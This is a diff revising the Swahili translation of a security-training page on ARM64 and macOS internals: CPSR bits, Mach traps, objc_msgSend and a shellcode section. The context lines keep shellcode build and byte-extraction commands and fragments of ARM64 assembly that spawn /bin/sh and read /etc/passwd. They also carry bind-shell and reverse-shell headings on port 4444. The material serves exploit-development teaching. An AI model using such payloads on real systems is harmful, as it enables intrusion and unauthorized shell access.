+- Biti za **`J`** na **`T`**: **`J`** inapaswa kuwa 0, na ikiwa **`T`** ni 0 instruction set A32 hutumika; ikiwa ni 1, T32 hutumika.
+- **IT Block State Register** (`ITSTATE`): Hizi ni biti za 10-15 na 25-26. Huhifadhi conditions za instructions zilizo ndani ya group iliyo na prefix ya **`IT`**.
+- Biti ya **`E`**: Huonyesha **endianness**.
+- **Mode and Exception Mask Bits** (0-4): Huamua execution state ya sasa. Ya 5 inaonyesha ikiwa program inaendeshwa kama 32bit (1) au 64bit (0). Nne zilizobaki zinawakilisha **exception mode** inayotumika kwa sasa (exception inapotokea na kushughulikiwa). Namba iliyowekwa **huonyesha priority ya sasa** ikiwa exception nyingine itatokea wakati hii bado inashughulikiwa.
 
 <figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Exceptions fulani zinaweza kuzimwa kwa kutumia bits **`A`**, `I`, `F`. Ikiwa **`A`** ni 1 inamaanisha **asynchronous aborts** zitasababisha. **`I`** inaundwa ili kujibu external hardware **Interrupts Requests** (IRQs). na F inahusiana na **Fast Interrupt Requests** (FIRs).
+- **`AIF`**: Exceptions fulani zinaweza kuzimwa kwa kutumia biti **`A`**, `I`, `F`. Ikiwa **`A`** ni 1, inamaanisha kuwa **asynchronous aborts** zitasababishwa. **`I`** husanidi majibu kwa **Interrupts Requests** (IRQs) za hardware ya nje, na `F` inahusiana na **Fast Interrupt Requests** (FIRs).
 
 ## macOS
 
@@ -330,7 +330,7 @@ Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3
 
 ### Mach Traps
 
-Angalia katika [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` na katika [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypes. Idadi ya juu ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, kwa hivyo unahitaji kuita nambari kutoka kwenye orodha ya hapo juu kwa **minus**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.
+Katika [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html), angalia `mach_trap_table`, na katika [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h), prototypes. Namba ya juu ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, kwa hiyo unahitaji kuita namba kutoka kwenye orodha iliyotangulia kwa kutumia **minus**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.
 
 Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kupata jinsi ya kuita syscalls hizi (na BSD):
 ```bash
@@ -340,32 +340,32 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-Kumbuka kwamba **Ida** na **Ghidra** pia zinaweza decompile **specific dylibs** kutoka kwenye cache kwa kupita tu cache.
+Kumbuka kwamba **Ida** na **Ghidra** pia zinaweza kutengeneza **decompile** ya **dylibs** maalum kutoka kwenye cache kwa kupitisha tu cache.
 
 > [!TIP]
-> Wakati mwingine ni rahisi kukagua msimbo ulioteuliwa (**decompiled**) kutoka **`libsystem_kernel.dylib`** **than** kukagua **source code** kwa sababu msimbo wa several syscalls (BSD and Mach) unatengenezwa via scripts (check comments in the source code) wakati katika dylib unaweza kupata ni nini kinachoitwa.
+> Wakati mwingine ni rahisi zaidi kukagua code ya **`libsystem_kernel.dylib`** iliyofanyiwa **decompile** kuliko kukagua **source code**, kwa sababu code ya syscalls kadhaa (BSD na Mach) hutengenezwa kupitia scripts (angalia comments katika source code), ilhali kwenye dylib unaweza kuona kinachoitwa.
 
 ### machdep calls
 
-XNU inaunga mkono aina nyingine ya calls inayoitwa machine dependent. Nambari za calls hizi zinategemea architecture na wala calls au nambari hazihakikishiwi kubaki thabiti.
+XNU inaunga mkono aina nyingine ya calls zinazoitwa machine dependent. Nambari za calls hizi hutegemea architecture, na calls au nambari hizo hazijahakikishiwa kubaki zilezile.
 
 ### comm page
 
-Hii ni kernel owner memory page ambayo ime mapped ndani ya address scape ya kila user process. Imeundwa kufanya transition kutoka user mode kwenda kernel space iwe haraka kuliko kutumia syscalls kwa kernel services ambazo zimetumika sana kiasi kwamba transition hii ingekuwa very inefficient.
+Hili ni kernel owner memory page ambalo lime-mapped kwenye address space ya kila user process. Limekusudiwa kufanya mabadiliko kutoka user mode kwenda kernel space kuwa ya haraka zaidi kuliko kutumia syscalls kwa kernel services zinazotumiwa sana kiasi kwamba mabadiliko haya yangekuwa yasiyo na ufanisi sana.
 
-Kwa mfano miito `gettimeofdate` husoma thamani ya `timeval` moja kwa moja kutoka kwenye comm page.
+Kwa mfano, call `gettimeofdate` husoma thamani ya `timeval` moja kwa moja kutoka kwenye comm page.
 
 ### objc_msgSend
 
-Ni super common kupata function hii ikitumiwa katika Objective-C au Swift programs. Function hii inaruhusu kuita method ya Objective-C object.
+Ni jambo la kawaida sana kuipata function hii ikitumika katika programu za Objective-C au Swift. Function hii huruhusu kuita method ya object ya Objective-C.
 
 Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
-- x0: self -> Pointer to the instance
-- x1: op -> Selector of the method
-- x2... -> Rest of the arguments of the invoked method
+- x0: self -> Pointer ya instance
+- x1: op -> Selector ya method
+- x2... -> Arguments zilizobaki za method iliyoitwa
 
-Hivyo, ikiwa utaweka breakpoint kabla ya branch kuelekea function hii, unaweza kwa urahisi kubaini ni nini kinaoitwa katika lldb na (katika mfano huu object inaita object kutoka `NSConcreteTask` ambayo itafanya command):
+Kwa hiyo, ukiweka breakpoint kabla ya branch kwenda kwenye function hii, unaweza kupata kwa urahisi kinacho- invoke katika lldb (katika mfano huu object inaita object kutoka `NSConcreteTask` ambayo itaendesha command):
 ```bash
 # Right in the line were objc_msgSend will be called
 (lldb) po $x0
@@ -384,31 +384,31 @@ whoami
 )
 ```
 > [!TIP]
-> Kuweka env variable **`NSObjCMessageLoggingEnabled=1`** inawezekana kurekodi (log) wakati function hii inapoitwa katika faili kama `/tmp/msgSends-pid`.
+> Kwa kuweka env variable **`NSObjCMessageLoggingEnabled=1`**, inawezekana kurekodi wakati function hii inapoitwa kwenye file kama `/tmp/msgSends-pid`.
 >
-> Zaidi ya hayo, kuweka **`OBJC_HELP=1`** na kuwaita binary yoyote kutakuonyesha environment variables nyingine unazoweza kutumia kurekodi wakati vitendo fulani vya Objc-C vinapotokea.
+> Zaidi ya hayo, kwa kuweka **`OBJC_HELP=1`** na kuita binary yoyote, unaweza kuona environment variables nyingine unazoweza kutumia **`log`** wakati actions fulani za Objc-C zinapotokea.
 
-Wakati function hii inapoitwa, inahitajika kupata method iliyoitwa ya instance iliyotajwa; kwa ajili hiyo hufanywa tafutaji mbalimbali:
+Wakati function hii inaitwa, inahitajika kutafuta method iliyoitwa ya instance iliyoonyeshwa; kwa hili, searches tofauti hufanywa:
 
-- Fanya utafutaji wa cache wa matumaini:
-- Ikiwa imefanikiwa, ipo sawa
+- Fanya optimistic cache lookup:
+- Ikiwa imefanikiwa, maliza
 - Pata runtimeLock (read)
-- If (realize && !cls->realized) realize class
-- If (initialize && !cls->initialized) initialize class
-- Jaribu cache ya darasa lenyewe:
-- Ikiwa imefanikiwa, ipo sawa
-- Jaribu class method list:
-- Ikiwa imepatikana, jaza cache na kamilisha
-- Jaribu superclass cache:
-- Ikiwa imefanikiwa, ipo sawa
-- Jaribu superclass method list:
-- Ikiwa imepatikana, jaza cache na kamilisha
-- If (resolver) try method resolver, and repeat from class lookup
-- Ikiwa bado uko hapa (= yote mengine yameshindwa) jaribu forwarder
+- Ikiwa (realize && !cls->realized), realize class
+- Ikiwa (initialize && !cls->initialized), initialize class
+- Jaribu cache ya class yenyewe:
+- Ikiwa imefanikiwa, maliza
+- Jaribu method list ya class:
+- Ikiwa imepatikana, jaza cache na umalize
+- Jaribu cache ya superclass:
+- Ikiwa imefanikiwa, maliza
+- Jaribu method list ya superclass:
+- Ikiwa imepatikana, jaza cache na umalize
+- Ikiwa (resolver), jaribu method resolver, na urudie kuanzia class lookup
+- Ikiwa bado uko hapa (= kila kitu kingine kimeshindikana), jaribu forwarder
 
 ### Shellcodes
 
-Ili kujenga:
+Kukompile:
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -416,14 +416,14 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-Ili kutoa mabaiti:
+Kutoa bytes:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
 echo -n '\\x'$c
 done
 ```
-Kwa macOS za hivi karibuni:
+Kwa matoleo mapya zaidi ya macOS:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
 for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -482,7 +482,7 @@ return 0;
 
 #### Shell
 
-Imetolewa kutoka [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na imeelezewa.
+Ilichukuliwa kutoka [**hapa**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na kuelezwa.<sup>[1]</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -554,7 +554,7 @@ sh_path: .asciz "/bin/sh"
 
 #### Soma kwa cat
 
-Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, kwa hiyo hoja ya pili (x1) ni array ya params (ambayo katika kumbukumbu inamaanisha stack ya anuani).
+Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, kwa hivyo argument ya pili (x1) ni array ya params (ambazo kwenye memory zinamaanisha stack ya anwani).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -580,7 +580,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### Endesha amri kwa sh kutoka kwa fork ili mchakato mkuu usiuwe
+#### Tekeleza command kwa kutumia sh kutoka kwenye fork ili process kuu isiuliwe
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -626,7 +626,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bind shell
 
-Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) katika **port 4444**
+Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) kwenye **port 4444**<sup>[2]</sup>
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -710,7 +710,7 @@ svc  #0x1337
 ```
 #### Reverse shell
 
-Kutoka [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell kwa **127.0.0.1:4444**
+Kutoka [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell kwa **127.0.0.1:4444**<sup>[3]</sup>.
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -777,4 +777,10 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
+## Marejeo
+
+- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
+- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
+- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
+
 {{#include ../../../banners/hacktricks-training.md}}
